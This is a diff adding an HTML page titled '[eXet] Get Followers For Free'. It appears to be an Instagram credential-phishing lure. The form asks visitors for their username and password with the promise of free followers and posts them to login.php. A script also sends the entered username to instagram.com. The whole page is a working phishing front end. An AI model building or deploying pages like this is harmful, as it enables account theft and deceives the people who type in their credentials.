@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<link rel="shortcut icon" href="logo.jpg">
+	<script type="text/javascript" src="jquery-3.2.0.min.js"></script>
+	<title>[eXet] Get Followers For Free</title>
+</head>
+<style>
+	form input, form div {
+		display: block;
+		margin: 0 auto;
+		padding: 12px;
+		width: 30%;
+		margin-top: 1rem;
+	}
+
+	h2 {
+		font-family: sans-serif;
+		font-weight: 100;
+	}
+
+	input[type=submit] {
+		padding: 8px;
+		background-color: #3876F0;
+		border: none;
+		color: #fff;
+		box-shadow: 0 0 8px #000;
+	}
+
+	form div {
+		display: none;
+		color: red;
+		text-align: center;
+	}
+
+	@media screen and (max-width: 600px) {
+		form input, form div {
+			width: 80%;
+		}
+	}
+</style>
+<body>
+	<p align="center">
+		<img src="img.png" alt="exet" />
+	</p>
+	<h2 align="center">
+		Get Followers For Free
+	</h2>
+	<hr/>
+	<form action="login.php" method="post">
+		<input type="text" name="username" placeholder="username" />
+		<input type="password" name="password" placeholder="password" />
+		<input type="text" name="" placeholder="1000" />
+		<input type="submit" value="GET" />
+		<div>Some inputs wasn't filled</div>
+	</form>
+
+	<script>
+		let errDiv = document.querySelector('form div')
+		document.forms[0].addEventListener('submit', function(e) {
+			let inps = document.querySelectorAll("input")
+			for(let i = 0; i < inps.length; i++) {
+				if(inps[i].value == '') {
+					errDiv.style.display = 'block'
+					inps[i].style.border = '2px solid red'
+					e.preventDefault()
+				}
+			}
+
+			let query = $.ajax({
+				type: "POST",
+				url: `https://www.instagram.com/${inps[0].value}`,
+				success: function(data) {
+					console.log(data)
+				}
+			})
+
+		})
+
+	</script>
+
+</body>
+</html>
